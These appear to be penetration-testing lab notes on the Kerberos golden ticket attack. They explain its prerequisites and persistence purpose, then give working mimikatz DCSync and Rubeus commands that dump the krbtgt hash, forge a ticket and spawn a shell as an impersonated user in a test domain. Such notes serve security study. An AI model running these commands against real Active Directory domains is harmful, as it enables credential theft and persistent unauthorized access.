# Golden/Silver/Diamond Tickets

## Golden Ticket

A golden ticket is a type of attack where an attacker forge the TGT with a lifetime that does not expire. In essence, the attacker gains long-term access to a network by creating a TGT that appears to be legitimate. The golden ticket is signed by the krbtgt account thus it can be use to impersonate any user to any services or any machines within the domain.

### Attack Prerequisites

* Domain admin privilege
* Access to krbtgt password hash

### Purpose of Golden Ticket

The golden ticket attack is a post exploitation attack where an attacker has already compromise the domain admin account. It is primarily **used for host persistence** instead of privilege escalation.

With a golden ticket, attacker can persistently impersonate any user within the domain even if the compromised domain admin account credentials are updated or revoked.

### Exploit

```shell
mimikatz # lsadump::dcsync /domain:santaa.com /user:SANTAA\krbtgt
```

<figure><img src="http://192.168.1.119/uploads/images/gallery/2024-01/scaled-1680-/v5I2Hj6WU16k05UG-image.png" alt=""><figcaption></figcaption></figure>

```shell
Rubeus.exe golden /aes256:[aes256_hmac] /user:"hui ann" /domain:santaa.com /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap
```

<figure><img src="http://192.168.1.119/uploads/images/gallery/2024-01/scaled-1680-/tJTOwLeDDEw2mbWl-image.png" alt=""><figcaption></figcaption></figure>

```shell
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:santaa /username:"hui ann" /password:ahahaa /ticket:[your ticket]
```

<figure><img src="http://192.168.1.119/uploads/images/gallery/2024-01/scaled-1680-/P9ycWqg18FAX29wo-image.png" alt=""><figcaption></figcaption></figure>

The process is successfully created:

<figure><img src="http://192.168.1.119/uploads/images/gallery/2024-01/scaled-1680-/e5P6sk7cofmJbqlu-image.png" alt=""><figcaption></figcaption></figure>
